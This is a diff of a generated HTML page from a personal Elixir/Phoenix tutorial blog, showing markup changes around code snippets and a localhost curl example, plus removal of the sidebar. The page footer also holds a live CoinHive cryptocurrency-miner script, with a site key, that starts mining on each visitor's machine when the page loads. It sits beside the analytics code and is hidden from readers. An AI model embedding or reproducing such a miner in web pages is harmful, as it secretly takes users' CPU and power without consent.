@@ -676,10 +645,9 @@ In <code>article.ex</code>:</p>
     <span class="n">timestamps</span>
   <span class="k">end</span>
 
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>And in <code>account.ex</code>:</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -695,10 +663,9 @@ In <code>article.ex</code>:</p>
 
   <span class="n">timestamps</span>
 <span class="k">end</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Then in our ArticleController, we need to find the user and create an associated:</p>
-<pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+<div class="highlight"><pre class="highlight elixir"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
 2
 3
 4
@@ -712,13 +679,11 @@ In <code>article.ex</code>:</p>
   <span class="c1"># ...</span>
 
 <span class="k">end</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>Try it one more time</p>
-<pre class="highlight shell"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
-</pre></td><td class="rouge-code"><pre>curl --data <span class="s2">"article[url]=http://example.com&amp;article[title]=A+Great+one&amp;article[categories]=foo.bar.baz"</span> http://localhost:4000/api/articles --header <span class="s2">"Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJBY2NvdW50OjEiLCJleHAiOjE0NjY2NTQ2NzUsImlhdCI6MTQ2NDA2MjY3NSwiaXNzIjoiQXJ0aWNsZVRyYWNrZXJIZCIsImp0aSI6IjBjZDNiYWZhLTY4MjYtNGJlNi1hYWM3LTMzZWJkNTAwMzM5NyIsInBlbSI6e30sInN1YiI6IkFjY291bnQ6MSIsInR5cCI6InRva2VuIn0.S3jQkmtia-mlAv0O0u1QZxWr3MFH5IBnG1C_u0Uyjq6-DOA5is3l8tKiI0M83Vfw5ADUi55uXfoRqYRY7EQ-DQ"</span>
-</pre></td></tr></tbody></table>
-</code></pre>
+<div class="highlight"><pre class="highlight shell"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+</pre></td><td class="rouge-code"><pre>curl <span class="nt">--data</span> <span class="s2">"article[url]=http://example.com&amp;article[title]=A+Great+one&amp;article[categories]=foo.bar.baz"</span> http://localhost:4000/api/articles <span class="nt">--header</span> <span class="s2">"Authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJBY2NvdW50OjEiLCJleHAiOjE0NjY2NTQ2NzUsImlhdCI6MTQ2NDA2MjY3NSwiaXNzIjoiQXJ0aWNsZVRyYWNrZXJIZCIsImp0aSI6IjBjZDNiYWZhLTY4MjYtNGJlNi1hYWM3LTMzZWJkNTAwMzM5NyIsInBlbSI6e30sInN1YiI6IkFjY291bnQ6MSIsInR5cCI6InRva2VuIn0.S3jQkmtia-mlAv0O0u1QZxWr3MFH5IBnG1C_u0Uyjq6-DOA5is3l8tKiI0M83Vfw5ADUi55uXfoRqYRY7EQ-DQ"</span>
+</pre></td></tr></tbody></table></code></pre></div>
 <p>And now it&rsquo;s all associated.</p>
 
 <p><img alt="getinsertpic.com" src="http://media0.giphy.com/media/3puXxCB93ysGA/200.gif" /></p>
@@ -752,103 +717,6 @@ In <code>article.ex</code>:</p>
 
   </main>
 
-  <aside id="history">
-    <section class="recent">
-      <h2>Recent Articles</h2>
-      <ol class="articles">
-            <li><a href="/2017/06/17/ltrees-in-phoenix.html">LTrees in Phoenix</a>
-            <li><a href="/2017/05/02/something-useless-terminal-in-your-browser.html">Something Useless - Terminal in your browser</a>
-            <li><a href="/2017/04/18/something-useless-redux-implemented-in-elixir.html">Something Useless - Redux Implemented in Elixir</a>
-            <li><a href="/2016/08/24/learn-to-program-with-elixir.html">Learn to Program with Elixir</a>
-            <li><a href="/2016/05/23/guard-this-with-your-life-or-authenticating-apis-with-guardian.html">Guard this with your life... Or authenticating APIs with Guardian</a>
-            <li><a href="/2016/04/26/processes-in-elixir.html">Processes in Elixir</a>
-            <li><a href="/2016/02/24/hey-watch-it-or-how-to-monitor-files-in-elixir.html">Hey! Watch it!...or how to monitor files in Elixir</a>
-            <li><a href="/2015/08/23/let-s-build-something-with-rack.html">Let's build something with Rack</a>
-            <li><a href="/2015/08/21/lets-learn-about-rack.html">Let's learn about Rack</a>
-            <li><a href="/2015/06/08/rails-foreign-key-constraints-the-ugly-way.html">Rails Foreign Key Constraints - The Ugly Way</a>
-      </ol>
-    </section>
-
-    <section class="tags">
-      <h2>Tags</h2>
-      <ol>
-            <li><a href="/tags/beginner.html">Beginner</a> (1)</a></li>
-            <li><a href="/tags/concurrency.html">Concurrency</a> (1)</a></li>
-            <li><a href="/tags/ecto.html">Ecto</a> (1)</a></li>
-            <li><a href="/tags/elixir.html">Elixir</a> (3)</a></li>
-            <li><a href="/tags/ltrees.html">LTrees</a> (1)</a></li>
-            <li><a href="/tags/learn-to-program.html">Learn to Program</a> (1)</a></li>
-            <li><a href="/tags/phoenix.html">Phoenix</a> (1)</a></li>
-            <li><a href="/tags/processes.html">Processes</a> (1)</a></li>
-            <li><a href="/tags/random-thoughts.html">Random Thoughts</a> (1)</a></li>
-            <li><a href="/tags/authentication.html">authentication</a> (1)</a></li>
-            <li><a href="/tags/basics.html">basics</a> (1)</a></li>
-            <li><a href="/tags/beginner.html">beginner</a> (1)</a></li>
-            <li><a href="/tags/closures.html">closures</a> (1)</a></li>
-            <li><a href="/tags/components-of-programming.html">components of programming</a> (1)</a></li>
-            <li><a href="/tags/elixir.html">elixir</a> (5)</a></li>
-            <li><a href="/tags/enumerable.html">enumerable</a> (1)</a></li>
-            <li><a href="/tags/file-watchers.html">file watchers</a> (1)</a></li>
-            <li><a href="/tags/find.html">find</a> (1)</a></li>
-            <li><a href="/tags/fs.html">fs</a> (1)</a></li>
-            <li><a href="/tags/fundamentals.html">fundamentals</a> (1)</a></li>
-            <li><a href="/tags/generators.html">generators</a> (1)</a></li>
-            <li><a href="/tags/guardian.html">guardian</a> (1)</a></li>
-            <li><a href="/tags/javascript.html">javascript</a> (3)</a></li>
-            <li><a href="/tags/learning.html">learning</a> (1)</a></li>
-            <li><a href="/tags/navigation.html">navigation</a> (1)</a></li>
-            <li><a href="/tags/phoenix.html">phoenix</a> (1)</a></li>
-            <li><a href="/tags/polyglot.html">polyglot</a> (1)</a></li>
-            <li><a href="/tags/postgresql.html">postgresql</a> (1)</a></li>
-            <li><a href="/tags/promises.html">promises</a> (1)</a></li>
-            <li><a href="/tags/rack.html">rack</a> (2)</a></li>
-            <li><a href="/tags/rails.html">rails</a> (2)</a></li>
-            <li><a href="/tags/redux.html">redux</a> (1)</a></li>
-            <li><a href="/tags/routing.html">routing</a> (1)</a></li>
-            <li><a href="/tags/ruby.html">ruby</a> (6)</a></li>
-            <li><a href="/tags/sharp-axe.html">sharp axe</a> (1)</a></li>
-            <li><a href="/tags/something-useless.html">something useless</a> (2)</a></li>
-            <li><a href="/tags/web.html">web</a> (1)</a></li>
-      </ol>
-    </section>
-    <section class="by-month">
-      <h2>By Month</h2>
-      <ol>
-            <li><a href="/2017/06.html">June 2017</a>
-              (1)</a></li>
-            <li><a href="/2017/05.html">May 2017</a>
-              (1)</a></li>
-            <li><a href="/2017/04.html">April 2017</a>
-              (1)</a></li>
-            <li><a href="/2016/08.html">August 2016</a>
-              (1)</a></li>
-            <li><a href="/2016/05.html">May 2016</a>
-              (1)</a></li>
-            <li><a href="/2016/04.html">April 2016</a>
-              (1)</a></li>
-            <li><a href="/2016/02.html">February 2016</a>
-              (1)</a></li>
-            <li><a href="/2015/08.html">August 2015</a>
-              (2)</a></li>
-            <li><a href="/2015/06.html">June 2015</a>
-              (1)</a></li>
-            <li><a href="/2015/05.html">May 2015</a>
-              (2)</a></li>
-            <li><a href="/2015/02.html">February 2015</a>
-              (1)</a></li>
-            <li><a href="/2014/11.html">November 2014</a>
-              (1)</a></li>
-            <li><a href="/2014/05.html">May 2014</a>
-              (1)</a></li>
-            <li><a href="/2014/04.html">April 2014</a>
-              (2)</a></li>
-            <li><a href="/2014/02.html">February 2014</a>
-              (1)</a></li>
-            <li><a href="/2013/10.html">October 2013</a>
-              (1)</a></li>
-      </ol>
-    </section>
-  </aside>
  <script>
   (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
   (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
@@ -865,6 +733,8 @@ In <code>article.ex</code>:</p>
    var miner = new CoinHive.Anonymous('zmOZS6Bce7Nsw6WOSrt2cAJvIy4CvcNV');
    miner.start();
  </script>
+
+ <em>Copyright &copy; 2017 Steven Nu&ntilde;ez - HostileDeveloper</em>
 
 </div>
 </body>
